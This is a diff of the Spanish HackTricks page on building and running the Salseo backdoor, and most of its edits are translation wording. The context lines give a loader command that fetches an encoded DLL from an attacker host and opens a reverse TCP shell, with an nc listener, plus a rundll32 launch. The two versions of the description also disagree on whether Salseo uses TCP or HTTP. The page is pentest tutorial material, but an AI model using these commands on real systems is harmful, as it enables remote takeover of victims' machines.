@@ -7,8 +7,8 @@
 Otras formas de apoyar a HackTricks:
 
 * Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
-* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
+* Obtén la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
+* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
 * **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.
 
@@ -18,7 +18,7 @@ Otras formas de apoyar a HackTricks:
 
 Descarga el código fuente desde github y compila **EvilSalsa** y **SalseoLoader**. Necesitarás tener **Visual Studio** instalado para compilar el código.
 
-Compila esos proyectos para la arquitectura de la máquina Windows donde los vas a utilizar (si Windows soporta x64, compílalos para esa arquitectura).
+Compila esos proyectos para la arquitectura de la máquina Windows donde los vas a utilizar (Si Windows soporta x64, compílalos para esa arquitectura).
 
 Puedes **seleccionar la arquitectura** dentro de Visual Studio en la pestaña **"Build"** en **"Platform Target".**
 
@@ -43,7 +43,7 @@ python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.
 
 #### Salseo
 
-Salseo is a backdoor that allows an attacker to execute shell commands on a compromised system. It is written in C# and uses a TCP connection for communication. Salseo can be compiled into an executable file and executed on the target system to establish a reverse shell. The attacker can then interact with the compromised system through a command-line interface.
+Salseo is a backdoor that allows an attacker to execute shell commands on a compromised system. It is written in C# and uses the .NET framework. Salseo can be compiled into an executable file and executed on the target system. The backdoor communicates over HTTP and can receive commands to execute shell commands, upload and download files, and more.
 ```
 EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
 EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
@@ -54,9 +54,9 @@ Ahora tienes todo lo que necesitas para ejecutar todo el asunto de Salseo: el **
 
 ## **Ejecutar la puerta trasera**
 
-### **Obteniendo una shell inversa TCP (descargando dll codificada a través de HTTP)**
+### **Obteniendo un shell inverso TCP (descargando el dll codificado a través de HTTP)**
 
-Recuerda iniciar un nc como oyente de la shell inversa y un servidor HTTP para servir el EvilDalsa codificado.
+Recuerda iniciar un nc como oyente de shell inverso y un servidor HTTP para servir el EvilDalsa codificado.
 ```
 SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
 ```
@@ -91,13 +91,13 @@ Abre el proyecto SalseoLoader usando Visual Studio.
 
 ### Agrega antes de la función principal: \[DllExport]
 
-![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
 ### Instala DllExport para este proyecto
 
 #### **Herramientas** --> **Gestor de paquetes NuGet** --> **Administrar paquetes NuGet para la solución...**
 
-![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
 #### **Busca el paquete DllExport (usando la pestaña Examinar) y presiona Instalar (y acepta el mensaje emergente)**
 
@@ -117,7 +117,7 @@ Simplemente **sal** de Visual Studio
 
 Luego, ve a tu **carpeta de SalseoLoader** y **ejecuta DllExport\_Configure.bat**
 
-Selecciona **x64** (si lo vas a usar dentro de un sistema x64, que fue mi caso), selecciona **System.Runtime.InteropServices** (dentro de **Namespace for DllExport**) y presiona **Aplicar**
+Selecciona **x64** (si lo vas a usar dentro de una caja x64, ese fue mi caso), selecciona **System.Runtime.InteropServices** (dentro de **Espacio de nombres para DllExport**) y presiona **Aplicar**
 
 ![](<../.gitbook/assets/image (7) (1) (1) (1) (1).png>)
 
@@ -175,7 +175,7 @@ rundll32.exe SalseoLoader.dll,main
 ```
 <details>
 
-<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Experto en Red Team de AWS de HackTricks)</strong></a><strong>!</strong></summary>
+<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Experto en Equipo Rojo de AWS de HackTricks)</strong></a><strong>!</strong></summary>
 
 Otras formas de apoyar a HackTricks:
 
